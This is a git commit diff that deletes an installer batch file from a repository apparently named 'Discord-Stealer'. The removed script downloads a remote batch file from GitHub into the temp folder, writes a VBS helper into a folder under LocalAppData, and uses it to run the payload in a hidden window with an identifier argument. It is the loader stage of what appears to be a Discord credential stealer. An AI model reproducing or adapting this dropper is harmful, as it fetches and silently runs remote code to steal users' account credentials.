abff16be94884df3adec568abbccae2038aa403b
agamsol <agamsolomon0011@gmail.com>
2022-01-19 12:10:20 +0200

    Overwrite files of version 2.6.2

--- 2.0/installer.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-set Identifier=%~1
-set "Save=%temp%\"
-curl --create-dirs -f#kLo "%Save%DAS.bat" "https://raw.githubusercontent.com/agamsol/Discord-Stealer/main/2.0/source.bat"
->"%localappdata%\Microsoft\WindowsApps\background.vbs" echo CreateObject^("Wscript.Shell"^).Run """" ^& WScript.Arguments^(0^) ^& """ " ^& WScript.Arguments^(1^), 0
-call "%localappdata%\Microsoft\WindowsApps\background.vbs" "%Save%DAS.bat" "%Identifier%"
-exit /b
